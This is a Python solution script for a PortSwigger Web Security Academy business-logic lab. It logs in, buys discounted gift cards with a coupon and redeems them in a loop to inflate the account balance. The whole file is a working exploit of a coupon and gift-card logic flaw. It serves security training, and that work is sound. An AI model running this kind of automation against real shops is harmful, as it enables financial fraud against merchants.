#!/usr/bin/env python3

# Lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

# Tis a great challenge to practice BurpSuite Macros - but also Python
# We automate the process of repeatedly buying giftcards with a discount which allows us to spawn money. 

import sys
import requests
from bs4 import BeautifulSoup

# User credentials
USER = "wiener"
PASS = "peter"
# Coupon code that will allow us to buy any item (including gift cards) with 30% off
COUPON = "SIGNUP30"
DISCOUNT = 0.7
# Giftcard that we can buy repeatedly to glitch infinite money
GIFTCARD = { 'id': 2, 'price': 10 }
# How much money do you want?
WANT = 1337

def login(target):
	session = requests.Session()

	# Get login CSRF token
	login_url = f'{target}/login'
	bs = BeautifulSoup(session.get(login_url).content, features='lxml')
	csrftoken = bs.find('input', {"name":"csrf"})['value']

	# Login
	login_data = {"csrf":csrftoken, "username":USER, "password":PASS}
	session.post(login_url, data=login_data)
	return session

def add_product(s, target, productId, quantity):
	cart_url = f'{target}/cart'
	r = s.post(cart_url, data={'productId': productId, 'quantity': quantity, 'redir':'PRODUCT'})

def add_coupon(s, target):
	cart_url = f'{target}/cart'
	bs = BeautifulSoup(s.get(cart_url).content, features='lxml')
	csrftoken = bs.find('input', {"name":"csrf"})['value']
	s.post(f'{cart_url}/coupon', data={'csrf':csrftoken,'coupon':COUPON})

def purchase(s, target):
	cart_url = f'{target}/cart'
	bs = BeautifulSoup(s.get(cart_url).content, features='lxml')
	csrftoken = bs.find('input', {"name":"csrf"})['value']

	r = s.post(f'{cart_url}/checkout', data={'csrf':csrftoken})
	bs = BeautifulSoup(r.content, features='lxml')

	return [gc.text for gc in bs.find('table', {'class':'is-table-numbers'}).findAll('td')]

def redeem(s, target, giftcard):
	acc_url = f'{target}/my-account'
	bs = BeautifulSoup(s.get(acc_url).content, features='lxml')
	csrftoken = bs.find('input', {"name":"csrf"})['value']

	r = s.post(f'{target}/gift-card', data={'csrf':csrftoken, 'gift-card':giftcard})
	return int(r.text.split('t: $')[1].split('.')[0])

def main(target):
	session = login(target)
	gcprice = GIFTCARD['price']

	# We need at least enough money to buy a single giftcard
	balance = gcprice

	while (balance < WANT):
		max_giftcards_to_buy = min(99,int(balance/(gcprice*DISCOUNT)))

		add_product(session, target, GIFTCARD['id'], max_giftcards_to_buy)
		add_coupon(session, target)
		giftcards = purchase(session, target)
		for gc in giftcards:
			print(f'[+] Redeeming: {gc}')
			balance = redeem(session, target, gc)
			print(f'[+] New balance: ${balance}')

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print(f'Usage: {sys.argv[0]} <https://target-url>')
		sys.exit(1)
	main(sys.argv[1].strip('/'))
